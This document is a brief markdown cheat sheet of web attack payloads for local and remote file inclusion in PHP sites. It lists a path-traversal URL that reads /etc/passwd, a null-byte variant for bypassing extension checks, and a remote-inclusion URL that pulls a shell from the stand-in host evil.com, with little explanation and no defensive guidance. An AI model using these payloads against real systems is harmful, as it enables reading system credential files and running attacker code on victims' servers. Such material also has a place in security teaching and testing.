# Local File Inclusions

### Simple LFI
```html
http://<victim-site>/index.php?location=../../../etc/passwd
```

### If the LFI vuln sanitizes for .pdf or put that to the end.
The `%00` is the null character that terminates the string
```html
http://<victim-site>/index.php?location=../../../etc/passwd%00
```

# Remote File Inclusions
Remote File Inclusions (RFI) works int he same way as LFI; the only difference is that the file to be included is pulled remotely

Our aim, in this case, is not just to read, but to include out own code in the execution. An exploitable URL would like this:
```html
http://<victim-site>/vuln.php?page=http://evil.com/shell.txt
```